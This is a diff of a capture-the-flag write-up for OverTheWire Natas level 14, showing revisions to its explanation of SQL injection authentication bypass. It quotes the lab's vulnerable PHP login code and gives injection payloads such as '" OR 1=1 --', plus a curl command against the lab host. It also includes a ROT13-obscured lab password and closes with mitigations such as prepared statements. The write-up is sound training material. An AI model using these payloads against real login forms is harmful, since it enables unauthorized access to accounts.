@@ -2,106 +2,102 @@
 **Date:** 2025-12-14  
 
 ## Obfuscated password (ROT13)  
-`?`
+`FqdVdOfSpm3lbgyALReMFMjoyxz0yeik`
 
 ---
 
 ## OBJECTIVE
 
->The level demonstrates basic **authentication bypass** using SQL injection. By exploiting the way SQL queries are built from user input, we can skip password verification and log in as the `admin` user (or any user). This challenge is a textbook case of:
+> This level demonstrates a basic **authentication bypass** using SQL injection. By exploiting the way SQL queries are built directly from user input, we can bypass password verification and trigger a successful login. This challenge is a textbook case of:
 >
->- Poor input sanitization
->- Vulnerable string interpolation in SQL
->- Classic `' OR 1=1 --` injection
->Clicking “View sourcecode” reveals:
-```php
-if(array_key_exists("username", $_REQUEST)) {
-    $link = mysqli_connect("localhost", "natas14", "<password>");
-    mysqli_select_db($link, "natas14");
+>- Poor input sanitization  
+>- Vulnerable string concatenation in SQL  
+>- Classic SQL injection via logical manipulation  
+>
+> Clicking “View sourcecode” reveals:
 
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("username", $_REQUEST)) {
+        $link = mysqli_connect("localhost", "natas14", "<password>");
+        mysqli_select_db($link, "natas14");
 
-    if($res = mysqli_query($link, $query)) {
-        if(mysqli_num_rows($res) > 0) {
+        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+
+        if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
             echo "Successful login! The password for natas15 is <censored>";
         } else {
             echo "Access denied!";
         }
-    } else {
-        echo "Query failed";
     }
-}
-```
 
 ---
 
 ## PURPOSE
 
-The query is built unsafely:
+The SQL query is constructed unsafely by directly interpolating user-controlled input:
 
-```sql
-SELECT * FROM users WHERE username="USERNAME" AND password="PASSWORD"
-```
+    SELECT * FROM users
+    WHERE username="USERNAME" AND password="PASSWORD"
 
-Since user input is inserted **directly** into the query, you can break out of the string context and inject your own SQL logic. We’ll bypass the password check by injecting something like:
+Because the input is concatenated into the query string without escaping or parameterization, an attacker can **break out of the quoted context** and inject additional SQL logic.
 
-```
-username = admin" -- 
-password = anything
-```
+By injecting a condition that always evaluates to true, we can force the query to return at least one row, satisfying the login check.
+
+For example:
+
+    username = " OR 1=1 --
+    password = anything
 
 Resulting SQL:
 
-```sql
-SELECT * FROM users WHERE username="admin" -- " AND password="..."
-```
+    SELECT * FROM users
+    WHERE username="" OR 1=1 -- " AND password="anything"
 
-Everything after `--` is ignored, so the query becomes:
+Everything after `--` is treated as a comment, so the effective query becomes:
 
-```sql
-SELECT * FROM users WHERE username="admin"
-```
+    SELECT * FROM users WHERE 1=1
+
+This returns rows unconditionally, resulting in a successful login.
 
 ---
 
 ## SOLUTION
 
-**Manual (browser):**
+### Manual (browser)
 
 1. Open the login form.
 2. Enter:
-   - Username: `admin" -- `
-   - Password: `anything`
-3. Submit.
+   - **Username:** `" OR 1=1 -- `
+   - **Password:** anything (or blank)
+3. Submit the form.
 
-You’ll see:
+You will see:
 
-```
-Successful login! The password for natas15 is <password>
-```
+    Successful login! The password for natas15 is <password>
 
-**cURL:**
+---
 
-```bash
-curl -s -u natas14:<password> \
-  --data "username=admin\" -- &password=irrelevant" \
-  http://natas14.natas.labs.overthewire.org/
-```
+### cURL
+
+    curl -u natas14:<password> \
+      -d 'username=" OR 1=1 -- ' \
+      -d 'password=x' \
+      http://natas14.natas.labs.overthewire.org/
 
 ---
 
 ## TAKEAWAYS
 
-- **SQL injection** happens when user input is inserted unsafely into SQL queries.
-- The classic `' OR 1=1 --` works because it breaks out of the string and appends a tautology.
-- The correct way to prevent this is:
-  - Always use **prepared statements**
-  - Never trust raw user input
-  - Escape user input properly
-- This level is a practical intro to authentication bypass via SQLi.
+- **SQL injection** occurs when user input is directly embedded into SQL queries.
+- Authentication logic that relies solely on query results is vulnerable to logic manipulation.
+- Comment operators (`--`) can be used to bypass parts of a query.
+- The correct mitigation is:
+  - Use **prepared statements / parameterized queries**
+  - Never concatenate raw user input into SQL
+  - Treat all client input as untrusted
+- This level is a canonical introduction to authentication bypass via SQL injection.
 
 ---
 
 Writeup author: **Jeremy Ray Jewell**  
-[GitHub](https://github.com/jeremyrayjewell)  
-[LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
+GitHub: https://github.com/jeremyrayjewell  
+LinkedIn: https://www.linkedin.com/in/jeremyrayjewell
